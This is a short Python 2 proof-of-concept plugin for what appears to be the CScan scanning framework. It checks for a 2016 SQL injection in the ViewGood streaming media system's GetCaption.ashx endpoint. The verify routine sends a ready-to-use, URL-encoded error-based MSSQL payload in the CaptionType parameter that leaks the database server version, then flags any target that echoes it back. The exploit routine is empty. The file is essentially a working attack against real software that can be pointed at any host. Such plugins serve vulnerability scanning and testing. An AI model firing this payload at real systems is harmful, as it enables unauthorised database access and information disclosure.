# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = 'd462eacb-f7dd-4e40-941a-1fd123ced2ee'
    name = '远古流媒体系统 SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2016-01-14'  # 漏洞公布时间
    desc = '''
        远古流媒体系统 /VIEWGOOD/ADI/portal/GetCaption.ashx 注入漏洞。
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=146420
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = '远古流媒体系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a114972a-b243-486e-aa1e-c44b3f68c09f'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload ='/VIEWGOOD/ADI/portal/GetCaption.ashx?CaptionType=1%27%20and%201%3Dconvert%28int%2C%28char%28116%29%252bchar%28121%29%252bchar%28113%29%252b@@version%29%29--&AssetID=1&CaptionName=11'
            target = arg + payload 
            code, head, res, errcode, _ = hh.http(target)
            if code == 500 and 'tyqMicrosoft SQL Server' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()